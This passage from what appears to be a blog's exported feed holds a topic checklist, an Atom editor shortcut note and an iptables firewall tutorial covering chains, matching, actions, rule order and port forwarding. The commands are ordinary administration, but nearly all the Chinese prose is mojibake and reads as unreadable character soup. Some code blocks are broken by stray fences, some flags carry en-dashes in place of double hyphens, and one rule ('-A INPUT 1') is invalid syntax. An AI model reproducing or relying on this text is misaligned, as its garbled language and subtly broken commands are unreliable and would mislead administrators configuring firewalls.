href="socket-error.md">socketå¸¸è§é”™è¯¯</a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-system-directory.md">linuxç³»ç»Ÿç›®å½•</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nodejs-best-practice.md">Node.jsæœ€ä½³å®è·µ</a></li><li><input checked="" disabled="" type="checkbox"> <a href="rabbitmq.md">RabbitMQ</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nohup.md">nohup</a></li><li><input checked="" disabled="" type="checkbox"> <a href="GUID.md">GUID</a></li><li><input disabled="" type="checkbox"> <a href="jvm.md">Javaè™šæ‹Ÿæœº</a></li><li><input checked="" disabled="" type="checkbox"> <a href="speedtest.md">ç½‘é€Ÿæµ‹è¯•</a></li><li><input checked="" disabled="" type="checkbox"> <a href="httpstat.md">httpstat</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nodejs-dns-cache.md">nodejs-dns-cache</a></li><li><input checked="" disabled="" type="checkbox"> <a href="modify-dns.md">ä¿®æ”¹DNS</a></li><li><input checked="" disabled="" type="checkbox"> <a href="mysql-explain.md">Mysql Explain è§£é‡Š</a></li><li><input disabled="" type="checkbox"> <a href="understand-docker.md">ç†è§£Docker</a></li><li><input checked="" disabled="" type="checkbox"> <a href="npm-config.md">NPMé…ç½®</a></li><li><input checked="" disabled="" type="checkbox"> <a href="soft-link&hard-link.md">è½¯è¿æ¥ä¸ç¡¬é“¾æ¥</a></li><li><input checked="" disabled="" type="checkbox"> <a href="localtunnel.md">localtunnel</a></li><li><input checked="" disabled="" type="checkbox"> <a href="spring-framework.md">Spring æ ¸å¿ƒæ¡†æ¶ä½“ç³»ç»“æ„</a></li><li><input checked="" disabled="" type="checkbox"> <a href="node-debugger.md">Node.jsè°ƒè¯•</a></li><li><input disabled="" type="checkbox"> <a href="prefetching-preloading-prebrowsing.md">ç½‘ç«™é¢„åŠ è½½æŠ€æœ¯</a></li><li><input disabled="" type="checkbox"> <a href="html5-application-cache.md">HTML5 åº”ç”¨ç¨‹åºç¼“å­˜</a></li><li><input disabled="" type="checkbox"> <a href="cors.md">è·¨åŸŸèµ„æºå…±äº« CORS</a></li><li><input checked="" disabled="" type="checkbox"> <a href="compact-sparse-bundle-image.md">å‹ç¼©ç¨€ç–é•œåƒ</a></li><li><input checked="" disabled="" type="checkbox"> <a href="git-delete-large-file.md">Git æ¸…ç†å¤§æ–‡ä»¶</a></li><li><input checked="" disabled="" type="checkbox"> <a href="bitwise-permission.md">ä½è¿ç®—å’Œæƒé™ç®¡ç†ç³»ç»Ÿ</a></li><li><input disabled="" type="checkbox"> <a href="webp.md">WebP</a></li><li><input disabled="" type="checkbox"> <a href="mysql-binlog.md">MySQL Binlog</a></li><li><input checked="" disabled="" type="checkbox"> <a href="mysql-master-slave.md">MySQL ä¸»ä»åŒæ­¥</a></li><li><input disabled="" type="checkbox"> <a href="make-makefile-cmake.md">make&amp;Makefile&amp;cmake</a></li><li><input disabled="" type="checkbox"> <a href="algorithmic-analysis.md">ç®—æ³•å¤æ‚åº¦åˆ†æ</a></li><li><input checked="" disabled="" type="checkbox"> <a href="intellij-keymap.md">Intellijå¿«æ·é”®</a></li><li><input checked="" disabled="" type="checkbox"> <a href="2fa.md">ä¸¤æ­¥éªŒè¯</a></li><li><input checked="" disabled="" type="checkbox"> <a href="java-logging.md">Java ä¸­çš„æ—¥å¿—åº“</a></li><li><input checked="" disabled="" type="checkbox"> <a href="vim.md">Vim å…¥é—¨</a></li><li><input checked="" disabled="" type="checkbox"> <a href="zookeeper.md">Zookeeper å¿«é€Ÿå¼€å§‹</a></li><li><input checked="" disabled="" type="checkbox"> <a href="kafka.md">Kafka å¿«é€Ÿå¼€å§‹</a></li><li><input disabled="" type="checkbox"> <a href="select-vs-poll-vs-epoll.md">select vs poll vs epoll</a></li><li><input checked="" disabled="" type="checkbox"> <a href="java-lambda.md">Java Lambda</a></li><li><input checked="" disabled="" type="checkbox"> <a href="http.md">http</a></li><li><input disabled="" type="checkbox"> <a href="http2.md">http2</a></li><li><input checked="" disabled="" type="checkbox"> <a href="git.md">git</a></li><li><input checked="" disabled="" type="checkbox"> <a href="async-await.md">async&#x2F;await</a></li><li><input checked="" disabled="" type="checkbox"> <a href="dig.md">dig</a></li><li><input disabled="" type="checkbox"> [åˆ†å¸ƒå¼ç³»ç»Ÿ]</li><li><input disabled="" type="checkbox"> <a href="https://github.com/tencent-wechat/phxsql">åˆ†å¸ƒå¼æ•°æ®åº“</a></li><li><input checked="" disabled="" type="checkbox"> <a href="consistent-hashing.md">ä¸€è‡´æ€§Hash</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx-root-alias.md">nginx-root-alias</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx-rewrite.md">nginx-rewrite</a></li><li><input checked="" disabled="" type="checkbox"> <a href="viewport.md">viewport</a></li><li><input checked="" disabled="" type="checkbox"> <a href="v8-heapdump.md">v8å †å†…å­˜åˆ†æ</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx-proxy-cache.md">Nginxç¼“å­˜é…ç½®</a></li><li><input checked="" disabled="" type="checkbox"> <a href="chunked-transfer-encoding.md">HTTP åˆ†å—ä¼ è¾“ç¼–ç </a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-user-group.md">Linux ç”¨æˆ·å’Œç”¨æˆ·ç»„</a></li><li><input checked="" disabled="" type="checkbox"> <a href="mini-rpc.md">è¿·ä½ RPC</a></li><li><input checked="" disabled="" type="checkbox"> <a href="traceroute.md">è·¯ç”±è¯Šæ–­</a></li><li><input checked="" disabled="" type="checkbox"> <a href="socks5.md">SOCKS5</a></li><li><input checked="" disabled="" type="checkbox"> <a href="browserify.md">Browserify</a></li><li><input disabled="" type="checkbox"> <a href="java.util.concurrent.md">Javaå¹¶å‘</a></li><li><input disabled="" type="checkbox"> <a href="http.md">HTTPåè®®</a></li><li><input checked="" disabled="" type="checkbox"> <a href="chrome.md">Chromeä½¿ç”¨åŠé…ç½®</a></li><li><input checked="" disabled="" type="checkbox"> <a href="dns.md">DNSåè®®</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-gcc.md">GCC</a></li><li><input checked="" disabled="" type="checkbox"> <a href="shadowsocks.md">Shadowsocks</a></li><li><input checked="" disabled="" type="checkbox"> <a href="http-vary.md">Http Vary</a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-service.md">LinuxæœåŠ¡</a></li><li><input checked="" disabled="" type="checkbox"> <a href="file-mode.md">æ–‡ä»¶æ¨¡å¼</a></li><li><input checked="" disabled="" type="checkbox"> <a href="java8-optional.md">Java8 Optional</a></li><li><input disabled="" type="checkbox"> <a href="transaction-isolation.md">äº‹ç‰©éš”ç¦»çº§åˆ«</a></li><li><input disabled="" type="checkbox"> <a href="awk.md">awk</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>atom-keymap.md</title>
      <link href="/post/atom-keymap.html"/>
      <url>/post/atom-keymap.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>atomå¤§éƒ¨åˆ†å¿«æ·é”®å’Œsublimeä¸€æ ·</p></blockquote><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD +"></a>CMD +</h4><h4 id="CMD-K"><a href="#CMD-K" class="headerlink" title="CMD + K +"></a>CMD + K +</h4><ul><li>[cmd + k + b] æ‰“å¼€&#x2F;å…³é—­ä¾§è¾¹æ </li></ul><h4 id="CMD-SHIFT"><a href="#CMD-SHIFT" class="headerlink" title="CMD + SHIFT +"></a>CMD + SHIFT +</h4><h4 id="CTRL"><a href="#CTRL" class="headerlink" title="CTRL +"></a>CTRL +</h4><h4 id="CTRL-SHIFT"><a href="#CTRL-SHIFT" class="headerlink" title="CTRL + SHIFT +"></a>CTRL + SHIFT +</h4><ul><li>[ctrl + shift + c] å¤åˆ¶å½“å‰æ–‡ä»¶è·¯å¾„</li><li>[ctrl + shift + k] åˆ é™¤å½“å‰è¡Œ</li></ul><h4 id="CTRL-CMD"><a href="#CTRL-CMD" class="headerlink" title="CTRL + CMD +"></a>CTRL + CMD +</h4><ul><li>[ctrl + cmd + up] ä¸Šç§»å½“å‰è¡Œ</li><li>[ctrl + cmd + down] ä¸‹ç§»å½“å‰è¡Œ</li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.jianshu.com/p/b8392151c0cd">ã€1ã€‘</a> <a href="http://www.imooc.com/article/1370">ã€2ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> atom </tag>
            
            <tag> keymap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iptables</title>
      <link href="/post/iptables.html"/>
      <url>/post/iptables.html</url>
      
        <content type="html"><![CDATA[<h3 id="è§„åˆ™å†™æ³•"><a href="#è§„åˆ™å†™æ³•" class="headerlink" title="è§„åˆ™å†™æ³•"></a>è§„åˆ™å†™æ³•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables [-t table] COMMAND chain CRETIRIA -j ACTION</span><br></pre></td></tr></table></figure><p>-t table: 4ä¸ª<code>filter</code> <code>nat</code> <code>mangle</code> <code>raw</code>ï¼Œé»˜è®¤ä¸º<code>filter</code><br>COMMAND: å®šä¹‰å¦‚ä½•å¯¹è§„åˆ™è¿›è¡Œç®¡ç†<br>chain: æŒ‡å®šä½ æ¥ä¸‹æ¥çš„è§„åˆ™åˆ°åº•æ˜¯åœ¨å“ªä¸ªé“¾ä¸Šæ“ä½œçš„ï¼Œå½“å®šä¹‰ç­–ç•¥çš„æ—¶å€™ï¼Œæ˜¯å¯ä»¥çœç•¥çš„<br>CRETIRIA: æŒ‡å®šåŒ¹é…æ ‡å‡†<br>-j ACTION: æŒ‡å®šå¦‚ä½•è¿›è¡Œå¤„ç†</p><p>ä¾‹å¦‚ï¼Œå¼€æ”¾80ç«¯å£ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -A INPUT -p tcp --dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„-tä¸º<code>filter</code><br>COMMANDä¸º<code>-A INPUT</code><br>CRETIRIAä¸º<code>-p tcp --dport 80</code><br>-jä¸º<code>ACCEPT</code>  </p><h4 id="COMMANDå‘½ä»¤"><a href="#COMMANDå‘½ä»¤" class="headerlink" title="COMMANDå‘½ä»¤"></a>COMMANDå‘½ä»¤</h4><ol><li><p>é“¾ç®¡ç†å‘½ä»¤<br> -P: è®¾ç½®é»˜è®¤ç­–ç•¥çš„ï¼ˆè®¾å®šé»˜è®¤é—¨æ˜¯å…³ç€çš„è¿˜æ˜¯å¼€ç€çš„ï¼‰<br> é»˜è®¤ç­–ç•¥ä¸€èˆ¬åªæœ‰ä¸¤ç§</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -P INPUT (DROP|ACCEPT)  é»˜è®¤æ˜¯å…³çš„/é»˜è®¤æ˜¯å¼€çš„</span><br></pre></td></tr></table></figure><p> æ¯”å¦‚ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -P INPUT DROP</span><br></pre></td></tr></table></figure><p> è¿™å°±æŠŠé»˜è®¤è§„åˆ™ç»™æ‹’ç»äº†ã€‚å¹¶ä¸”æ²¡æœ‰å®šä¹‰å“ªä¸ªåŠ¨ä½œï¼Œæ‰€ä»¥å…³äºå¤–ç•Œè¿æ¥éƒ½ä¼šè¢«æ‹’ç»ã€‚</p><p> -F: FLASHï¼Œæ¸…ç©ºè§„åˆ™é“¾çš„(æ³¨æ„æ¯ä¸ªé“¾çš„ç®¡ç†æƒé™)</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -F PREROUTING</span><br><span class="line">iptables -t nat -F æ¸…ç©ºnatè¡¨çš„æ‰€æœ‰é“¾</span><br></pre></td></tr></table></figure><p> -N: æ”¯æŒç”¨æˆ·æ–°å»ºä¸€ä¸ªé“¾</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -N Docker</span><br></pre></td></tr></table></figure><p> åˆ›å»ºåï¼Œä½¿ç”¨-Lå‘½ä»¤æŸ¥çœ‹å‘ç°ä¼šå¤šä¸€æ¡è§„åˆ™é“¾</p><p> -X: ç”¨äºåˆ é™¤ç”¨æˆ·è‡ªå®šä¹‰çš„ç©ºé“¾<br> ä½¿ç”¨æ–¹æ³•è·Ÿ-Nç›¸åŒï¼Œä½†æ˜¯åœ¨åˆ é™¤ä¹‹å‰å¿…é¡»è¦å°†é‡Œé¢çš„é“¾ç»™æ¸…ç©ºæ˜‚äº†</p><p> -E: ç”¨æ¥Rename chainä¸»è¦æ˜¯ç”¨æ¥ç»™ç”¨æˆ·è‡ªå®šä¹‰çš„é“¾é‡å‘½å</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -E Docker docker</span><br></pre></td></tr></table></figure><p> -Z: æ¸…ç©ºé“¾ï¼ŒåŠé“¾ä¸­é»˜è®¤è§„åˆ™çš„è®¡æ•°å™¨çš„ï¼ˆæœ‰ä¸¤ä¸ªè®¡æ•°å™¨ï¼Œè¢«åŒ¹é…åˆ°å¤šå°‘ä¸ªæ•°æ®åŒ…ï¼Œå¤šå°‘ä¸ªå­—èŠ‚ï¼‰</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -Z INPUT</span><br></pre></td></tr></table></figure></li><li><p>è§„åˆ™ç®¡ç†å‘½ä»¤<br> -A: è¿½åŠ ï¼Œåœ¨å½“å‰é“¾çš„æœ€åæ–°å¢ä¸€ä¸ªè§„åˆ™</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure><p> -I num : æ’å…¥ï¼ŒæŠŠå½“å‰è§„åˆ™æ’å…¥ä¸ºç¬¬å‡ æ¡</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ç¦æ­¢192.168.3.167è®¿é—®5601ç«¯å£ï¼Œæ’å…¥åˆ°ç¬¬ä¸€æ¡è§„åˆ™</span><br><span class="line">iptables -I INPUT 1 -s 192.168.3.167 -p tcp --dport 5601 -j DROP</span><br></pre></td></tr></table></figure><p> -R numï¼šReplaysæ›¿æ¢&#x2F;ä¿®æ”¹ç¬¬å‡ æ¡è§„åˆ™</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ä¿®æ”¹ç¬¬ä¸€æ¡è§„åˆ™</span><br><span class="line">iptables -R INPUT 1 -s 192.168.3.167 -p tcp --dport 5601 -j ACCEPT</span><br></pre></td></tr></table></figure><p> -D numï¼šåˆ é™¤ï¼Œæ˜ç¡®æŒ‡å®šåˆ é™¤ç¬¬å‡ æ¡è§„åˆ™</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -D INPUT 1</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹ç®¡ç†å‘½ä»¤â€-Lâ€<br> é™„åŠ å­å‘½ä»¤<br> -n: ä»¥æ•°å­—çš„æ–¹å¼æ˜¾ç¤ºipï¼Œå®ƒä¼šå°†ipç›´æ¥æ˜¾ç¤ºå‡ºæ¥ï¼Œå¦‚æœä¸åŠ -nï¼Œåˆ™ä¼šå°†ipåå‘è§£ææˆä¸»æœºå<br> -v: æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯<br> -vv<br> -vvv: è¶Šå¤šè¶Šè¯¦ç»†<br> -x: åœ¨è®¡æ•°å™¨ä¸Šæ˜¾ç¤ºç²¾ç¡®å€¼ï¼Œä¸åšå•ä½æ¢ç®—<br> â€“line-numbers: æ˜¾ç¤ºè§„åˆ™çš„è¡Œå·<br> -t natï¼šæ˜¾ç¤ºæ‰€æœ‰çš„å…³å¡çš„ä¿¡æ¯  </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -L -n -v --line-numbers</span><br></pre></td></tr></table></figure></li></ol><h4 id="åŒ¹é…æ ‡å‡†CRETIRIA"><a href="#åŒ¹é…æ ‡å‡†CRETIRIA" class="headerlink" title="åŒ¹é…æ ‡å‡†CRETIRIA"></a>åŒ¹é…æ ‡å‡†CRETIRIA</h4><ol><li><p>é€šç”¨åŒ¹é…<br> -sï¼šæŒ‡å®šä½œä¸ºæºåœ°å€åŒ¹é…ï¼Œè¿™é‡Œä¸èƒ½æŒ‡å®šä¸»æœºåç§°ï¼Œå¿…é¡»æ˜¯IP</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># åŒ¹é…IPæ˜¯192.168.3.167è¯·æ±‚</span><br><span class="line">iptables -I INPUT 1 -s 192.168.3.167 -p tcp --dport 5601 -j DROP</span><br></pre></td></tr></table></figure><p> è€Œä¸”åœ°å€å¯ä»¥å–åï¼ŒåŠ ä¸€ä¸ªâ€œ!â€è¡¨ç¤ºé™¤äº†å“ªä¸ªIPä¹‹å¤–</p><p> -dï¼šè¡¨ç¤ºåŒ¹é…ç›®æ ‡åœ°å€</p><p> -pï¼šç”¨äºåŒ¹é…åè®®çš„ï¼ˆè¿™é‡Œçš„åè®®é€šå¸¸æœ‰3ç§ï¼ŒTCP&#x2F;UDP&#x2F;ICMPï¼‰</p><p> -i eth0ï¼šä»è¿™å—ç½‘å¡æµå…¥çš„æ•°æ®<br> æµå…¥ä¸€èˆ¬ç”¨åœ¨INPUTå’ŒPREROUTINGä¸Š</p><p> -o eth0ï¼šä»è¿™å—ç½‘å¡æµå‡ºçš„æ•°æ®<br> æµå‡ºä¸€èˆ¬åœ¨OUTPUTå’ŒPOSTROUTINGä¸Š</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># æ‰“å¼€å›ç¯</span><br><span class="line">iptables -A INPUT -i lo -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -o lo -j ACCEPT</span><br></pre></td></tr></table></figure></li><li><p>æ‰©å±•åŒ¹é…</p><ol><li>éšå«æ‰©å±•ï¼šå¯¹åè®®çš„æ‰©å±•<br> -p tcp: TCPåè®®çš„æ‰©å±•ã€‚ä¸€èˆ¬æœ‰ä¸‰ç§æ‰©å±•<br> â€“dport XX-XXï¼šæŒ‡å®šç›®æ ‡ç«¯å£,ä¸èƒ½æŒ‡å®šå¤šä¸ªéè¿ç»­ç«¯å£,åªèƒ½æŒ‡å®šå•ä¸ªç«¯å£ï¼Œæ¯”å¦‚<br> â€“dport 21  æˆ–è€… â€“dport 21-23 (æ­¤æ—¶è¡¨ç¤º21,22,23)<br> â€“sportï¼šæŒ‡å®šæºç«¯å£<br> â€“tcp-fiagsï¼šTCPçš„æ ‡å¿—ä½ï¼ˆSYN,ACKï¼ŒFIN,PSHï¼ŒRST,URGï¼‰<br> å¯¹äºå®ƒï¼Œä¸€èˆ¬è¦è·Ÿä¸¤ä¸ªå‚æ•°ï¼š<br> 1.æ£€æŸ¥çš„æ ‡å¿—ä½<br> 2.å¿…é¡»ä¸º1çš„æ ‡å¿—ä½<br> â€“tcpflags syn,ack,fin,rst syn   &#x3D;    â€“syn<br> è¡¨ç¤ºæ£€æŸ¥è¿™4ä¸ªä½ï¼Œè¿™4ä¸ªä½ä¸­synå¿…é¡»ä¸º1ï¼Œå…¶ä»–çš„å¿…é¡»ä¸º0ã€‚æ‰€ä»¥è¿™ä¸ªæ„æ€å°±æ˜¯ç”¨äºæ£€æµ‹ä¸‰æ¬¡æ¡æ‰‹çš„ç¬¬ä¸€æ¬¡åŒ…çš„ã€‚å¯¹äºè¿™ç§ä¸“é—¨åŒ¹é…ç¬¬ä¸€åŒ…çš„SYNä¸º1çš„åŒ…ï¼Œè¿˜æœ‰ä¸€ç§ç®€å†™æ–¹å¼ï¼Œå«åšâ€“syn<br> -p udpï¼šUDPåè®®çš„æ‰©å±•<br> â€“dport<br> â€“sport<br> -p icmpï¼šicmpæ•°æ®æŠ¥æ–‡çš„æ‰©å±•<br> â€“icmp-typeï¼š<br> echo-request(è¯·æ±‚å›æ˜¾)ï¼Œä¸€èˆ¬ç”¨8 æ¥è¡¨ç¤º<br> æ‰€ä»¥ â€“icmp-type 8 åŒ¹é…è¯·æ±‚å›æ˜¾æ•°æ®åŒ…<br> echo-reply ï¼ˆå“åº”çš„æ•°æ®åŒ…ï¼‰ä¸€èˆ¬ç”¨0æ¥è¡¨ç¤º</li><li>æ˜¾å¼æ‰©å±•ï¼ˆ-mï¼‰<br> æ‰©å±•å„ç§æ¨¡å—<br> -m multiportï¼šè¡¨ç¤ºå¯ç”¨å¤šç«¯å£æ‰©å±•<br> ä¹‹åæˆ‘ä»¬å°±å¯ä»¥å¯ç”¨æ¯”å¦‚ â€“dports 21,23,80</li></ol></li></ol><h4 id="è¯¦è§£-j-ACTION"><a href="#è¯¦è§£-j-ACTION" class="headerlink" title="è¯¦è§£ -j ACTION"></a>è¯¦è§£ -j ACTION</h4><ol><li>DROPï¼šæ‚„æ‚„ä¸¢å¼ƒ<br> ä¸€èˆ¬æˆ‘ä»¬å¤šç”¨DROPæ¥éšè—æˆ‘ä»¬çš„èº«ä»½ï¼Œä»¥åŠéšè—æˆ‘ä»¬çš„é“¾è¡¨</li><li>REJECTï¼šæ˜ç¤ºæ‹’ç»</li><li>ACCEPTï¼šæ¥å—<br> custom_chainï¼šè½¬å‘ä¸€ä¸ªè‡ªå®šä¹‰çš„é“¾</li><li>DNAT</li><li>SNAT</li><li>MASQUERADEï¼šæºåœ°å€ä¼ªè£…</li><li>REDIRECTï¼šé‡å®šå‘ï¼šä¸»è¦ç”¨äºå®ç°ç«¯å£é‡å®šå‘</li><li>MARKï¼šæ‰“é˜²ç«å¢™æ ‡è®°çš„</li><li>RETURNï¼šè¿”å›<br> åœ¨è‡ªå®šä¹‰é“¾æ‰§è¡Œå®Œæ¯•åä½¿ç”¨è¿”å›ï¼Œæ¥è¿”å›åŸè§„åˆ™é“¾ã€‚</li></ol><h3 id="è§„åˆ™çš„å…ˆåé¡ºåº"><a href="#è§„åˆ™çš„å…ˆåé¡ºåº" class="headerlink" title="è§„åˆ™çš„å…ˆåé¡ºåº"></a>è§„åˆ™çš„å…ˆåé¡ºåº</h3><p>iptablesè§„åˆ™çš„é¡ºåºå¾ˆé‡è¦ï¼Œé…ç½®ä¸å¥½è§„åˆ™ä¼šèµ·ä¸åˆ°é¢„æƒ³çš„æ•ˆæœã€‚<br>ä¾‹å¦‚ï¼Œç°åœ¨æœ‰å¦‚ä¸‹è§„åˆ™<br><img src="/images/QQ20160816-0@2x.jpg"><br>ç°åœ¨æƒ³è¦åŠ ä¸€ä¸ªè§„åˆ™ï¼Œä¸è®©IPæ˜¯192.168.3.167çš„ç”¨æˆ·è®¿é—®5601ç«¯å£<br>è¿è¡Œä¸‹é¢å‘½ä»¤æ·»åŠ ä¸€æ¡è§„åˆ™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT 1 -s 192.168.3.167 -p tcp --dport 5601 -j DROP</span><br></pre></td></tr></table></figure><p><img src="/images/QQ20160816-1@2x.jpg"><br>æ·»åŠ åï¼Œæµ‹è¯•åå‘ç°æ ¹æœ¬æ²¡æœ‰èµ·ä½œç”¨ã€‚ä¸ºä»€ä¹ˆå‡ºç°è¿™ç§æƒ…å†µï¼Ÿå› ä¸ºè§„åˆ™åœ¨åŒ¹é…æ—¶æ˜¯ä»ä¸Šåˆ°ä¸‹ï¼Œå¦‚æœåŒ¹é…æˆåŠŸå°±æ‰§è¡Œåé¢çš„Actionäº†ã€‚åœ¨è¿™é‡Œï¼ŒIPæ˜¯192.168.3.167çš„ç”¨æˆ·åœ¨è¯·æ±‚5601ç«¯å£æ—¶é¦–å…ˆä¼šåŒ¹é…åˆ°ç¬¬ä¸‰æ¡è§„åˆ™<br><img src="/images/QQ20160816-2@2x.jpg"><br>åŒ¹é…åï¼Œç›´æ¥å°±ACCEPTäº†ã€‚è€Œæœ€åä¸€æ¡æ‹¦æˆªIP192.168.3.167çš„è§„åˆ™æ ¹æœ¬å°±ä¸ä¼šæ‰§è¡Œã€‚è¿™ç§æƒ…å†µä¸‹ï¼ŒæŠŠæ‹¦æˆªè§„åˆ™æ”¾åˆ°ç¬¬ä¸€ä½å°±å¯ä»¥äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -I INPUT 1 -s 192.168.3.167 -p tcp --dport 5601 -j DROP</span><br></pre></td></tr></table></figure><h3 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h3><p>1ã€ ç›´æ¥é€šè¿‡å‘½ä»¤é…ç½®çš„è§„åˆ™åœ¨é‡å¯åå°±ä¸¢å¤±äº†ï¼Œè¦æƒ³é‡å¯åä¹Ÿç”Ÿæ•ˆã€‚å¯ä»¥è¿è¡Œ<code>service iptables save</code>å‘½ä»¤ä¿å­˜ã€‚</p><p>2ã€ è¿è¡Œwgetå‘½ä»¤æŠ¥ä¸èƒ½dnsä¸èƒ½è§£æé”™è¯¯<br>è¿™ä¸ªé—®é¢˜çš„ä¸»è¦åŸå› æ˜¯æ²¡æœ‰å¼€æ”¾53ç«¯å£ï¼Œè¿™ä¸ªåœ°æ–¹æœ‰ä¸ªéœ€è¦æ³¨æ„çš„ã€‚è¿™é‡Œæ˜¯ä»æœ¬åœ°å‘èµ·çš„è¯·æ±‚ï¼Œæ‰€ä»¥INPUTè§„åˆ™ä¸­åº”è¯¥æŒ‡å®šâ€“sport 53ï¼ŒOUTPUTè§„åˆ™ä¸­è¦æŒ‡å®šâ€“dport 53  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -o eth0 -p udp --dport 53 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A INPUT -i eth0 -p udp --sport 53 -j ACCEPT</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">é…ç½®å®Œè¿™ä¸ªå‘ç°è¿˜æ˜¯ä¸è¡Œï¼ŒåŸå› ç±»ä¼¼ã€‚è¿˜éœ€è¦å¼€å‘ä»æœ¬åœ°å‘èµ·çš„HTTPï¼ŒHTTPSè¯·æ±‚ã€‚ä¸‹é¢æ˜¯å®Œæ•´çš„é…ç½®sshã€httpã€httpsçš„ä¾‹å­</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»å¤–éƒ¨å‘èµ·çš„è¯·æ±‚<br>iptables -A OUTPUT -o eth0 -p tcp â€“dport 443 -m state â€“state NEW,ESTABLISHED -j ACCEPT<br>iptables -A INPUT -i eth0 -p tcp â€“sport 443 -m state â€“state ESTABLISHED -j ACCEPT</p><p>ä»æœ¬æœºå‘èµ·çš„è¯·æ±‚<br>iptables -A OUTPUT -o eth0 -p tcp -m multiport â€“dports 22,80,443  -j ACCEPT<br>iptables -A INPUT -i eth0 -p tcp -m multiport â€“sports 22,80,443  -j ACCEPT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ç«¯å£è½¬å‘</span><br></pre></td></tr></table></figure><p>iptables -t nat -A PREROUTING -p tcp  â€“dport [local_port] -j DNAT â€“to [remote_ip]:[remote_port]<br>iptables -t nat -A POSTROUTING -j MASQUERADE</p><pre><code>é˜¿é‡Œäº‘-åŒ—äº¬-çº½çº¦### å‚è€ƒ- [iptablesè¯¦è§£](http://blog.chinaunix.net/uid-26495963-id-3279216.html)- [iptableså‘½ä»¤è¯¦è§£å’Œä¸¾ä¾‹](http://blog.chinaunix.net/uid-9950859-id-98279.html)- [linuxä¸‹ç”¨iptablesåšæœ¬æœºç«¯å£è½¬å‘æ–¹æ³•](http://blog.csdn.net/zzhongcy/article/details/42738285)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDN</title>
      <link href="/post/cdn.html"/>
      <url>/post/cdn.html</url>
      
